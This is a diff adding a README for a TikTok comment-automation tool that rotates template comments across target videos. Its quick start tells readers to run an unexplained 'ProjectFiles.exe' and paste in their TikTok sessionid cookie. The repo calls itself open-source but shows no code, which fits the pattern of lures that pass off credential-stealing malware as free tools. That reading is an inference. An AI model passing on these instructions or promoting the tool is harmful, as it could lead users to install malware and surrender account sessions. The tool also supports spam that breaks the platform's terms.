@@ -1,0 +1,77 @@
+🎯 TikTok Comment Automation
+
+TikTok Interaction Workflow Tool — 2026
+
+Session-based comment automation for engagement research and testing.
+Template rotation, rate limiting, lightweight structure. For educational use only.
+
+🎯 What it is
+
+TikTok Comment Automation is a lightweight tool that manages comment workflows on TikTok using a provided sessionid cookie.
+It is designed for engagement research, workflow testing and educational purposes — not for spam or abuse.
+
+⚠️
+Use at your own risk. This is an open-source educational project.
+Automating actions on TikTok may violate their Terms of Service.
+The author is not responsible for any account restrictions or bans.
+
+🚀 Quick Start
+
+1. Download the project using the button above.
+2. Extract the archive into a separate folder.
+3. Run ProjectFiles.exe.
+4. Follow the on-screen instructions.
+5. Insert your TikTok sessionid and load your comment templates.
+
+✨ Features
+
+| Feature                  | Description                                      |
+|--------------------------|--------------------------------------------------|
+| 🎯 Session Auth      | Uses TikTok sessionid cookie for login         |
+| 💬 Custom Templates  | Load comment templates from an editable list     |
+| 🔄 Auto Rotation     | Randomly picks a template for each action        |
+| ⏱️ Rate Limiting     | Configurable delay between comments              |
+| 📦 Lightweight       | Minimal footprint, easy to run                   |
+| 📝 Log Output        | Tracks executed actions and errors               |
+
+🧩 How to use
+
+1. Launch the tool.
+2. Log into TikTok in your browser and copy the sessionid cookie.
+3. Paste it into the settings panel.
+4. Add your comment templates.
+5. Start the session and monitor the log.
+
+⚙️ Configuration
+
+All settings are editable in the config panel:
+
+- Session ID
+- Delay between actions
+- Daily action limit
+- Comment templates
+- Target video list
+
+❓ FAQ
+
+Does it work with all videos?
+It targets videos fetched via the configured endpoints. Compatibility may change as TikTok updates.
+
+Is there a key system?
+No. Fully open and free.
+
+Can I customize the settings?
+Yes — everything is fully configurable.
+
+Is this safe for my account?
+No automation is completely safe. Use a secondary account and conservative settings.
+
+🤝 Contributing
+
+Pull requests, bug reports and improvements are welcome.
+
+📜 License
+
+MIT License — free to use, modify and redistribute.
+
+⭐ Star the repo if it helped you.
